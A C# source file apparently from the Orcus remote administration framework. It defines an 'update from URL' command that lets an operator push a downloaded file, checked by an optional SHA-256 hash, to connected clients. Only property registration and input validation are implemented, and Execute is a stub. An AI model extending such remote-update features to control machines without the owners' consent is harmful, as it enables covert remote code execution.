using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.Client
{
    public class UpdateFromUrlCommand : StaticCommand
    {
        public UpdateFromUrlCommand()
        {
            this.RegisterProperty(() => DownloadUrl, Resources.StaticCommands.Client_UpdateFromUrlCommand_DownloadUrl,
                    Resources.StaticCommands.Client_UpdateFromUrlCommand_DownloadUrl_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => Hash, Resources.StaticCommands.Client_UpdateFromUrlCommand_FileHash,
                    Resources.StaticCommands.Client_UpdateFromUrlCommand_FileHash_Description,
                    Resources.StaticCommands.FileCheck)
                .RegisterProperty(() => Arguments, Resources.StaticCommands.Arguments,
                    Resources.StaticCommands.ArgumentsDescription, Resources.StaticCommands.Common);
        }

        public string DownloadUrl { get; set; }
        public string Hash { get; set; }
        public string Arguments { get; set; }

        public override Guid CommandId { get; } = new Guid(0xe08e79f0, 0xcaea, 0xe341, 0x8a, 0xb2, 0xef, 0x84, 0xe1,
            0x8f, 0xa2, 0x5f);

        public override string Name { get; } = Resources.StaticCommands.Client_UpdateFromUrlCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_UpdateFromUrlCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            if (DownloadUrl.IsNullOrWhiteSpace())
                return new InputValidationResult(Resources.StaticCommands.UrlCannotBeEmpty, ValidationState.Error);

            if (!string.IsNullOrEmpty(Hash) && (Hash?.Length != 64 || !Hash.IsHex()))
                return InputValidationResult.Error(Resources.StaticCommands.InvalidSHA256HashValueHex);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }
    }
}